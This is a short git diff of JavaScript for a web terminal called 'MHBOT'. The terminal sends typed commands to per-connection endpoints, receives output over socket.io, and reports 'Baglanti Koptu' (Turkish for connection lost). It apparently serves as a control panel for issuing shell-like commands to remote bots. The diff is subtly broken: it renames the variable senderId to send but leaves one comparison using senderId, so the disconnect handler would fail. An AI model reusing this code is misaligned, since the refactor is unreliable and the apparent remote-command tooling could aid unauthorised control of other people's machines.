@@ -1,9 +1,9 @@
 $(document).ready(() => {
     let socket = io('http://127.0.0.1:3000');
-    let senderId = $('#terminal').data('connection-id');
+    let send = $('#terminal').data('connection-id');
     let terminal = $('#terminal').terminal(function (cmd, term) {
         $.ajax({
-            url: '/control/'+senderId+'/cmd/',
+            url: '/command/'+send+'/cmd/',
             data: {
                 cmd: cmd
             },
@@ -13,7 +13,7 @@ $(document).ready(() => {
         greetings: 'MHBOT',
         name: 'MHBOT',
         height: 600,
-        prompt: '> '
+        prompt: '--> '
     });
 
     socket.on('data', function (data) {
@@ -25,7 +25,7 @@ $(document).ready(() => {
     socket.on('delete-connection', function(data){
         let packet =JSON.parse(data);
         if(packet.id === senderId){
-            terminal.echo('Baglanti Koptu (' +senderId +')');
+            terminal.echo('Baglanti Koptu (' +send +')');
             terminal.pause();
         }
     });
